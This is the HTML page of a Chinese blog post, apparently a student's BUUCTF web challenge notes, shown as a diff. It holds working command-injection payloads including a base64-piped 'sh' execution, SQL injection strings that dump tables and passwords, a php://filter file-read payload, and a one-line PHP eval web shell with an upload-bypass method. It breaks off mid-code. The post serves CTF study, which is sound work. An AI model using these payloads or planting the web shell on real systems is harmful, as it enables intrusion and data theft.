@@ -1,0 +1,299 @@
+
+
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width,inital-scale=1,user-scalable=no">
+  <title>buuctf web [ cly ]</title>
+  <!-- bootstrapcss文件 -->
+ <!--  <link rel="stylesheet" href="https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous"> -->
+<!--   
+<link rel="stylesheet" href="/css/zhl.css">
+
+ -->
+  
+    <!-- stylesheets list from config.yml -->
+    
+      <link rel="stylesheet" href="/css/fork-awesome.min.css">
+    
+      <link rel="stylesheet" href="/css/zhl.css">
+    
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+<div class="container-fluid">
+  <div class="row">
+  <div id="wrap" class="col-md-12">
+    <div id="header">
+	<div id="header-left">
+	<h1 id="header-title"> 
+	<a href="/">
+		cly
+	</a>
+	</h1>
+	
+	</div>
+	<div id="header-right">
+		
+		
+		<a href="/"  title="home"><i class="fa fa-home ">home</i></a>
+		
+		<a target="_blank" rel="noopener" href="https://github.com/lizehongss/demo_show"  title="demo"><i class="fa fa-code ">demo</i></a>
+		
+		<a href="/about"  title="about"><i class="fa fa-user ">about</i></a>
+		
+		<a href="/"  title="music"><i class="fa fa-music ">music</i></a>
+		
+		
+	</div>
+</div>
+
+  </div>
+  </div>
+  <div id="content" class="row">
+    <div id="content-left" class="col-md-4">
+      
+
+	
+
+	
+	<div class="widget-wrap">
+		<h3 class="widget-title fa fa-tags">标签</h3>
+		<div class="widget tags">
+		<a class="tag-span-link" href="/tags/SQL/" rel="tag">SQL<span class="tag-span-count">1</span></a> <a class="tag-span-link" href="/tags/ctf-crypto/" rel="tag">ctf crypto<span class="tag-span-count">2</span></a> <a class="tag-span-link" href="/tags/ctf-pwn/" rel="tag">ctf pwn<span class="tag-span-count">1</span></a> <a class="tag-span-link" href="/tags/ctf-web/" rel="tag">ctf web<span class="tag-span-count">1</span></a>
+		</div>
+	</div>
+
+
+	
+	<div class="widget-wrap">
+		<h3 class="widget-title fa fa-archive">归档</h3>
+		<div class="widget">
+			<ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/">2024</a><span class="archive-list-count">5</span></li></ul>
+		</div>
+	</div>
+
+
+
+    </div>
+    <div id="content-right" class="col-md-8">
+    
+<article id="post">
+	<div class="post-title">
+  <h1>buuctf web</h1>
+  	</div>
+  <div class="page-meta">
+  	<span class="fa-wrap">
+  		<i class="fa fa-clock-o"></i>
+  		<span class="date-meta">2024-09-22</span>
+  	</span>
+  	<span class="fa-wrap">
+  		
+  		<i class="fa fa-tags"></i>
+  		<span class="tags-meta">ctf web</span>
+  		
+  	</span>
+  	<span class="fa-wrap">
+  		
+  	</span>
+  </div>
+  <div class="post-content">
+  <h1 id="buuctf-web学习记录"><a href="#buuctf-web学习记录" class="headerlink" title="buuctf web学习记录"></a>buuctf web学习记录</h1><h3 id="空格的绕过"><a href="#空格的绕过" class="headerlink" title="空格的绕过"></a>空格的绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;cat,flag.txt&#125;</span><br><span class="line">cat$&#123;IFS&#125;flag.txt</span><br><span class="line">cat$IFS$9flag.txt: $IFS$9 $9指传过来的第9个参数</span><br><span class="line">cat&lt;flag.txt</span><br><span class="line">cat&lt;&gt;flag.txt</span><br><span class="line">kg=$&#x27;\x20flag.txt&#x27;&amp;&amp;cat$kg</span><br><span class="line">(\x20转换成字符串就是空格，这里通过变量的方式巧妙绕过)</span><br></pre></td></tr></table></figure>
+
+<h5 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h5><p>payload1</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?ip=127.0.0.1;a=g;cat$IFS$9fla$a.php</span><br></pre></td></tr></table></figure>
+
+<p>变量拼接绕过flag</p>
+<p>payload2</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?ip=127.0.0.1;cat$IFS$9`ls`</span><br></pre></td></tr></table></figure>
+
+<p>内联执行，相当于<code>cat &#39;ls&#39;</code>，把目录下的文件都查看一遍。</p>
+<p>payload3</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?ip=127.0.0.1;echo$IFS$9Y2F0IGZsYWcucGhwCg==$IFS$9|$IFS$9base64$IFS$9-d$IFS$9|$IFS$9sh</span><br></pre></td></tr></table></figure>
+<p>使用base64绕过特殊的字符串。</p>
+<h3 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h3><p>可能的SQL语句：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="operator">&lt;</span><span class="keyword">table</span><span class="operator">&gt;</span> <span class="keyword">where</span> <span class="operator">&lt;</span>id<span class="operator">&gt;=</span>id</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="operator">&lt;</span><span class="keyword">table</span><span class="operator">&gt;</span> <span class="keyword">where</span> <span class="operator">&lt;</span>id<span class="operator">&gt;=</span><span class="string">&#x27;id&#x27;</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="operator">&lt;</span><span class="keyword">table</span><span class="operator">&gt;</span> <span class="keyword">where</span> <span class="operator">&lt;</span>id<span class="operator">&gt;=</span>&quot;id&quot;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="operator">&lt;</span><span class="keyword">table</span><span class="operator">&gt;</span> <span class="keyword">where</span> (<span class="operator">&lt;</span>id<span class="operator">&gt;=</span>id)</span><br></pre></td></tr></table></figure>
+
+<h4 id="起手试探"><a href="#起手试探" class="headerlink" title="起手试探"></a>起手试探</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">1&#x27;</span> #</span><br></pre></td></tr></table></figure>
+
+<h4 id="最简单的万能密码："><a href="#最简单的万能密码：" class="headerlink" title="最简单的万能密码："></a>最简单的万能密码：</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;or&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>理解：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">SQL语句相当于</span><br><span class="line">select * from x where y=&#x27;[input]&#x27;</span><br><span class="line">插入万能密码之后就是</span><br><span class="line">select * from x where y=&#x27;1&#x27;or&#x27;1&#x27;=&#x27;1&#x27;</span><br><span class="line"></span><br><span class="line">y=&#x27;1&#x27;-&gt;false</span><br><span class="line">&#x27;1&#x27;=&#x27;1&#x27;-&gt;true</span><br><span class="line">false or true-&gt;true</span><br><span class="line">于是就能成功select</span><br></pre></td></tr></table></figure>
+
+<h4 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h4><p>在起手试探时，如果只有1是有回显的，就可以考虑堆叠注入。</p>
+<p>堆叠注入类似终端命令的使用，不过使用分号来执行其他的命令。常用的如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">爆库</span><br><span class="line">show databases;</span><br><span class="line"></span><br><span class="line">爆表</span><br><span class="line">show tables;</span><br><span class="line"></span><br><span class="line">爆字段</span><br><span class="line">show columns from 1;</span><br><span class="line">show * from 1;</span><br></pre></td></tr></table></figure>
+
+<h4 id="sql-mode参数说明"><a href="#sql-mode参数说明" class="headerlink" title="sql_mode参数说明"></a>sql_mode参数说明</h4><p>使用方法举例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set sql_mode=PIPES_AS_CONCAT</span><br></pre></td></tr></table></figure>
+
+<p>具体的参数的说明：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">ONLY_FULL_GROUP_BY:</span><br><span class="line"></span><br><span class="line">对于GROUP BY聚合操作,如果在SELECT中的列,没有在GROUP BY中出现,那么这个SQL是不合法的,因为列不在GROUP BY从句中</span><br><span class="line"></span><br><span class="line">NO_AUTO_VALUE_ON_ZERO:</span><br><span class="line"></span><br><span class="line">该值影响自增长列的插入。默认设置下,插入0或NULL代表生成下一个自增长值。如果用户 希望插入的值为0,而该列又是自增长的,那么这个选项就有用了。</span><br><span class="line"></span><br><span class="line">STRICT_TRANS_TABLES:</span><br><span class="line"></span><br><span class="line">在该模式下,如果一个值不能插入到一个事务表中,则中断当前的操作,对非事务表不做限制</span><br><span class="line"></span><br><span class="line">NO_ZERO_IN_DATE:</span><br><span class="line"></span><br><span class="line">在严格模式下,不允许日期和月份为零</span><br><span class="line"></span><br><span class="line">NO_ZERO_DATE:</span><br><span class="line"></span><br><span class="line">设置该值,mysql数据库不允许插入零日期,插入零日期会抛出错误而不是警告。</span><br><span class="line"></span><br><span class="line">ERROR_FOR_DIVISION_BY_ZERO:</span><br><span class="line"></span><br><span class="line">在INSERT或UPDATE过程中,如果数据被零除,则产生错误而非警告。如 果未给出该模式,那么数据被零除时MySQL返回NULL</span><br><span class="line"></span><br><span class="line">NO_AUTO_CREATE_USER:</span><br><span class="line"></span><br><span class="line">禁止GRANT创建密码为空的用户</span><br><span class="line"></span><br><span class="line">NO_ENGINE_SUBSTITUTION:</span><br><span class="line"></span><br><span class="line">如果需要的存储引擎被禁用或未编译,那么抛出错误。不设置此值时,用默认的存储引擎替代,并抛出一个异常</span><br><span class="line"></span><br><span class="line">PIPES_AS_CONCAT:</span><br><span class="line"></span><br><span class="line">将&quot;||&quot;视为字符串的连接操作符而非或运算符,这和Oracle数据库是一样的,也和字符串的拼接函数Concat相类似</span><br><span class="line"></span><br><span class="line">ANSI_QUOTES:</span><br><span class="line"></span><br><span class="line">启用ANSI_QUOTES后,不能用双引号来引用字符串,因为它被解释为识别符</span><br><span class="line"></span><br><span class="line">ORACLE的sql_mode设置等同:PIPES_AS_CONCAT, ANSI_QUOTES, IGNORE_SPACE, NO_KEY_OPTIONS, NO_TABLE_OPTIONS, NO_FIELD_OPTIONS, NO_AUTO_CREATE_USER.</span><br></pre></td></tr></table></figure>
+
+<h4 id="猜测后端SQL语句"><a href="#猜测后端SQL语句" class="headerlink" title="猜测后端SQL语句"></a>猜测后端SQL语句</h4><p>大概就是通过输入不同的内容来猜测，比如 || 这个符号就用下面的方法来测试。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">select command1 || command2 </span><br><span class="line"></span><br><span class="line">情况一：若command1为非0数字，则结果为1。</span><br><span class="line"></span><br><span class="line">情况二：若command1为0或字母，command2为非0数字，则结果为1。</span><br><span class="line"></span><br><span class="line">情况三：command1和command2都不为非0数字，则结果为0。</span><br></pre></td></tr></table></figure>
+
+<h4 id="短路算法"><a href="#短路算法" class="headerlink" title="短路算法"></a>短路算法</h4><p>|| 逻辑或的短路：a||b</p>
+<p>计算机发现a是真，那么输出a；如果a是假，那么输出b</p>
+<p>0 || 12   –&gt;12 前面假，输出后面</p>
+<p>23 || 0   –&gt;23 前面真，输出前面</p>
+<h4 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h4><p>使用<code>union select</code>来进行联合查询。</p>
+<p>查看列数的另一种方法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; ordered by 1#</span><br><span class="line">1&#x27; ordered by 2#</span><br><span class="line">1&#x27; ordered by 3#</span><br><span class="line">······</span><br></pre></td></tr></table></figure>
+
+<p>根据正确显示的最大值判断列数。</p>
+<h5 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h5><p>首先观察查询列数，方法类似下面：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1#</span><br><span class="line">1&#x27; union select 1,2#</span><br><span class="line">1&#x27; union select 1,2,3#</span><br><span class="line">······</span><br></pre></td></tr></table></figure>
+
+<p>这里只有1,2,3的时候有回显，所以是三列。下面就是爆数据的代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">爆数据库</span><br><span class="line">1&#x27; union select 1,2,database()#</span><br><span class="line">爆表名(limit 0,1表示第一行的表)</span><br><span class="line">1&#x27; union select 1,2,table_name from information_schema.tables where table_schema=database() limit 0,1#</span><br><span class="line">爆表名(limit 1,1表示第二行的表)</span><br><span class="line">1&#x27; union select 1,2,table_name from information_schema.tables where table_schema=database() limit 1,1#</span><br><span class="line">爆列名</span><br><span class="line">1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;l0ve1ysq1&#x27;#</span><br><span class="line">爆数据</span><br><span class="line">1&#x27; union select 1,2,group_concat(id,username,password) from l0ve1ysq1#</span><br></pre></td></tr></table></figure>
+
+<h5 id="BUUCTF-强网杯-2019-随便注"><a href="#BUUCTF-强网杯-2019-随便注" class="headerlink" title="BUUCTF[强网杯 2019]随便注"></a>BUUCTF[强网杯 2019]随便注</h5><p>首先有一个知识点，表名为数字时，要用反引号包起来查询，如下面的代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">爆字段</span><br><span class="line">0&#x27;; show columns from `1919810931114514 `; #</span><br></pre></td></tr></table></figure>
+
+<p>payload1</p>
+<p>貌似说1会从words表里面获取id为1的内容，所以这里把我们需要表修改为words的名字，然后就能看到我们需要的flag了。<br>这里的数据库应该是不会重置的，所以修改成功一次之后，再输入1才能得到flag。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;; rename table words to word1; rename table `1919810931114514` to words;alter table words add id int unsigned not Null auto_increment primary key; alter table words change flag data varchar(100);#</span><br></pre></td></tr></table></figure>
+
+<p>payload2</p>
+<p>这个非常厉害，用十六进制编码来执行命令，感觉很有用。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#</span><br></pre></td></tr></table></figure>
+
+<p>payload3</p>
+<p>这个handler的方法绕开了已经过滤的字符串，算是一个比较小众的代码了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;; handler `1919810931114514` open as `a`; handler `a` read next;#</span><br></pre></td></tr></table></figure>
+
+<h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><p>is_string()：检测变量是否是字符串</p>
+<p>isset()：检测变量是否已设置并且非 NULL</p>
+<p>in_array(要搜索的值，要搜索的数组)：搜索数组中是否存在指定的值</p>
+<p>mb_substr($page，n，m)：返回page中从第n位开始，到n+m位字符串的值</p>
+<p>mb_strpos()：查找字符串在另一个字符串中首次出现的位置</p>
+<p>urldecode()：将url编码后的字符串还原成未编码的样子</p>
+<h5 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h5><p>代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$cat=$_GET[&#x27;cat&#x27;];</span><br><span class="line">echo $cat;</span><br><span class="line">if($cat==&#x27;dog&#x27;)&#123;</span><br><span class="line">    echo &#x27;Syc&#123;cat_cat_cat_cat&#125;&#x27;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>只要传入<code>/?cat=dog</code>就行</p>
+<h3 id="PHP封装协议"><a href="#PHP封装协议" class="headerlink" title="PHP封装协议"></a>PHP封装协议</h3><p><code>php://filter/read=convert.base64-encode/resource=xxx.php</code></p>
+<p>php:&#x2F;&#x2F;filter 是php中独有的一个协议，可以作为一个中间流来处理其他流，可以进行任意文件的读取；根据名字filter，可以很容易想到这个协议可以用来过滤一些东西； 使用不同的参数可以达到不同的目的和效果：</p>
+<p>resource&#x3D;&lt;要过滤的数据流&gt; 指定了你要筛选过滤的数据流。 必选</p>
+<p>read&#x3D;&lt;读链的筛选列表&gt;可以设定一个或多个过滤器名称，以管道符（|）分隔。 可选</p>
+<p>write&#x3D;&lt;写链的筛选列表&gt; 可以设定一个或多个过滤器名称，以管道符（|）分隔。 可选</p>
+<p>&lt;；两个链的筛选列表&gt; 任何没有以 read&#x3D; 或write&#x3D;作前缀 的筛选器列表会视情况应用于读或写链。</p>
+<p>php:&#x2F;&#x2F;filter与包含函数结合时，php:&#x2F;&#x2F;filter流会被当作php文件执行。所以我们一般对其进行编码，阻止其不执行。从而导致任意文件读取。</p>
+<p>read&#x3D;convert.base64-encode，用base64编码输出，不然会直接当做php代码执行，看不到源代码内容。</p>
+<h5 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h5><p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
+<p>不知道为啥这里不需要白名单里面的hint.php。</p>
+<h3 id="终端命令"><a href="#终端命令" class="headerlink" title="终端命令"></a>终端命令</h3><h5 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h5><p>简单使用管道符来进行命令执行，<code>ls /</code>可以查看根目录下的文件情况。</p>
+<h5 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h5><p>使用<code>../</code>来进行目录穿越。</p>
+<h3 id="burpsuite"><a href="#burpsuite" class="headerlink" title="burpsuite"></a>burpsuite</h3><p>发送的信息中，请求头中的信息如下：</p>
+<p>Referer：表示页面是从哪里跳转过来的，示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: http://example.com/page1</span><br></pre></td></tr></table></figure>
+
+<p>User-Agent：用于表示使用的浏览器的名字，示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent:Syclover</span><br></pre></td></tr></table></figure>
+
+<p>Content-Type：描述请求体的数据类型，示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: application/json</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br></pre></td></tr></table></figure>
+
+<p>Accept：指定客户端可以接受的响应内容类型，示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Accept: application/json</span><br></pre></td></tr></table></figure>
+
+<p>Authorization：传递身份验证和授权信息，示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Authorization:Bearer your-token</span><br></pre></td></tr></table></figure>
+
+<p>Cache-Control：控制客户端和服务器端的缓存行为，示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cache-Control: no-cache</span><br></pre></td></tr></table></figure>
+
+<p>Cookie：用于客户端和服务端之间传递cookie信息，示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: sessionid=123456</span><br></pre></td></tr></table></figure>
+
+<p>X-Forwarded-For：用于标识HTTP请求的原始客户端IP地址，代理服务器会使用到，示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: 127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<h4 id="POST的使用"><a href="#POST的使用" class="headerlink" title="POST的使用"></a>POST的使用</h4><p>当需要POST内容时，需要将请求头的GET改成POST，然后增加下面的一段代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: application/x-www-form-urlencoded</span><br></pre></td></tr></table></figure>
+
+<p>注意：post的值需要与请求头中的其他内容之间间隔至少一行。</p>
+<h5 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h5><p>提示：没看清么？回去再仔细看看吧。</p>
+<p>这种浏览器上看不到信息的情况下，可以使用burpsuite来查看源代码。</p>
+<h3 id="中国蚁剑"><a href="#中国蚁剑" class="headerlink" title="中国蚁剑"></a>中国蚁剑</h3><p>下载地址：百度网盘链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1Fl0_hFtCtfUgcNIOwKeGEA">https://pan.baidu.com/s/1Fl0_hFtCtfUgcNIOwKeGEA</a> 提取码：nvjc</p>
+<p>官方网站：github上搜索antsword和antsword-loader，使用loader中的.exe进行初始化。</p>
+<h4 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h4><p>代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#x27;123&#x27;]); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>把这段代码保存成合适的格式，然后用蚁剑连接到上传之后的地址，密码即为POST里面的123，就能看到所有的文件。</p>
+<p>需要注意的是，蚁剑里面连接上的地址应该以.php结尾，要做到这一点，可以上传.jpg的文件，然后在burpsuite里面把后缀改为.php发送，这样可以绕过前端的检查。</p>
+<h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><p>一个在线运行网址：<a target="_blank" rel="noopener" href="https://run.uv.cc/">https://run.uv.cc/</a></p>
+<h4 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h4><p>涉及到魔术方法的函数：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">__construct</span>()，类的构造函数</span><br><span class="line"><span class="title function_ invoke__">__destruct</span>()，类的析构函数</span><br><span class="line"><span class="title function_ invoke__">__call</span>()，在对象中调用一个不可访问方法时调用</span><br><span class="line"><span class="title function_ invoke__">__callStatic</span>()，用静态方式中调用一个不可访问方法时调用</span><br><span class="line"><span class="title function_ invoke__">__get</span>()，获得一个类的成员变量时调用</span><br><span class="line"><span class="title function_ invoke__">__set</span>()，设置一个类的成员变量时调用</span><br><span class="line"><span class="title function_ invoke__">__isset</span>()，当对不可访问属性调用<span class="keyword">isset</span>()或<span class="keyword">empty</span>()时调用</span><br><span class="line"><span class="title function_ invoke__">__unset</span>()，当对不可访问属性调用<span class="keyword">unset</span>()时被调用。</span><br><span class="line"><span class="title function_ invoke__">__sleep</span>()，执行<span class="title function_ invoke__">serialize</span>()时，先会调用这个函数</span><br><span class="line"><span class="title function_ invoke__">__wakeup</span>()，执行<span class="title function_ invoke__">unserialize</span>()时，先会调用这个函数</span><br><span class="line"><span class="title function_ invoke__">__toString</span>()，类被当成字符串时的回应方法</span><br><span class="line"><span class="title function_ invoke__">__invoke</span>()，调用函数的方式调用一个对象时的回应方法</span><br><span class="line"><span class="title function_ invoke__">__set_state</span>()，调用<span class="title function_ invoke__">var_export</span>()导出类时，此静态方法会被调用。</span><br><span class="line"><span class="title function_ invoke__">__clone</span>()，当对象复制完成时调用</span><br><span class="line"><span class="title function_ invoke__">__autoload</span>()，尝试加载未定义的类</span><br><span class="line"><span class="title function_ invoke__">__debugInfo</span>()，打印所需调试信息</span><br></pre></td></tr></table></figure>
+
+<h5 id="BUU-CODE-REVIEW-1"><a href="#BUU-CODE-REVIEW-1" class="headerlink" title="BUU CODE REVIEW 1"></a>BUU CODE REVIEW 1</h5><p>题目中涉及到魔术方法的代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BUU</span> </span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$correct</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$input</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="variable language_">$this</span>-&gt;correct = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">uniqid</span>());</span><br><span class="line">           <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;correct === <span class="variable language_">$this</span>-&gt;input) &#123;</span><br><span class="line">               <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; <span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span 